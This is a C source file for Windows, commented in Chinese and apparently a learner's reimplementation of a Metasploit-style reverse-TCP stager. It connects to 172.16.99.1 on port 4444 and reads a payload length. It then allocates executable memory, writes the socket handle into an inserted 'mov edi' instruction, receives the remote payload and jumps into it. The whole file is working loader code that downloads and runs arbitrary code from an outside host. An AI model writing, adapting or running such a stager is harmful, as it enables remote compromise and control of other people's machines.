#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

int recv_all(SOCKET my_socket, void* buffer, int len) { //len为buffer的大小，void * buffer为一个void类型的指向buffer缓冲区的指针，buffer会用来存储从socket接收到的数据。socket为当前指定的socket连接。
	int    tret = 0;  //从第一轮开始到当前为止实际接收到的总字节数。
	int    nret = 0; //当前轮次接收到的字节数。因为可能要分好几轮去接收大量的字节，每一轮接收到的字节不一定相同，所以就设置了nret来存储当前轮的实际接收到的字节数。
	void* startb = buffer; //将buffer的指针传给startb，这时候startb指向buffer的开头
	while (tret < len) {
		nret = recv(my_socket, (char*)startb, len - tret, 0); //这一次接收到的字节数，不一定一次能够接收完所有的字节，将实际接收到的字节数存到nret中。
		(char*)startb+=nret;//改变指针，让指针指向下一个存储点，比如接收到了31个字节，这时候就指针就应该增加31，这时候指到了第32，下一轮又新的字节接收到的时候，就会从第32个地址开始存储。
		tret += nret;//接收到的总字节数增加nret个。
	}
	return tret;
}
void safeexit()
{
	WSACleanup();
	exit(1);
}
/* 设置windows Sock规范版本号 */
void set_editor() {
	printf("开始设置版本号");
	WSADATA	container; //一个结构体,可以存储我们希望使用‘windows Sock规范’的版本号与ws2_32.dll支持的‘windows Sock规范’的最高的版本号。
	WORD 		version_number; //存储版本号的容器

	version_number = MAKEWORD(2, 2); //设置我们希望使用的‘windows Sock规范’的版本号，从后往前看的，版本号2.2，若为MSKEWORD(1,2),则版本号为2.1

	if (WSAStartup(version_number, &container) < 0) {// 设置我们希望使用的‘windows Sock规范’的版本号，如果设置失败则返回值不是0，如果成功则返回0
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();//放弃加载ws2_32.dllwin。    备注：socket连接必须加载这个dll
		exit(1);//退出程序，并输出错误码‘1’。
	}
	else
	{
		printf("win_socket规范版本设置成功\n");
	}
}

void llisten()
{
	struct addrinfo* result = NULL; //我的理解是result存储的是hints的地址，getaddrinfo函数会将hints的地址传给result。
	struct addrinfo hints; //存储着服务端的socket的相关详细数据。
	ZeroMemory(&hints, sizeof(hints)); //初始化hints

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;



	printf("开始执行getaddrinfo来设置目标的信息\n");
	int Result = getaddrinfo("172.16.99.1", "4444", &hints, &result); //设置服务端的相关信息
	if (Result != 0)
	{
		printf("getaddrinfo失败，错误码为%ld\n", WSAGetLastError());
		safeexit();
	}


	
	printf("开始创建socket\n");
	SOCKET sockett;
	sockett = socket(result->ai_family, result->ai_socktype, result->ai_protocol);//创建一个socket
	if (sockett == INVALID_SOCKET) {
		printf("socket创建失败 %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		safeexit();
	}




	printf("开始connect目标\n");
	Result = connect(sockett, result->ai_addr, (int)result->ai_addrlen);//将服务端的信息与socket进行绑定，相当于给socket指定一些详细信息，比如监听端口，使用协议等。
	if (Result == SOCKET_ERROR) {
		printf("连接失败： %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(sockett);
		safeexit();
	}
	freeaddrinfo(result);//释放result使用的内存







	ULONG32 size;
	char* buffer;
	void (*function)();
	printf("开始接收数据");
	int count = recv(sockett, (char*)&size, 4, 0);
	if (count != 4 || size <= 0)
		printf("read a strange or incomplete length value\n");
	/* 分配一段可读可写可执行的内存 */
	printf("分配一段可读可写可执行的内存\n");
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
	{
		printf("不能分配内存\n");
	}


	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* 复制4个字节的数据到buffer中，从buffer[1]开始存储 */
	printf("复制内存\n");
	memcpy(buffer + 1, &sockett, 4);

	/* 读取剩下的数据存储到buffer中，从buffer[5]开始存储*/
	count = recv_all(sockett, buffer + 5, size);
	printf("复制内存2\n");
	/* cast our buffer as a function and call it */
	function = (void (*)())buffer;
	printf("执行\n");
	function();
}



int main()
{
	set_editor();
	llisten();



}
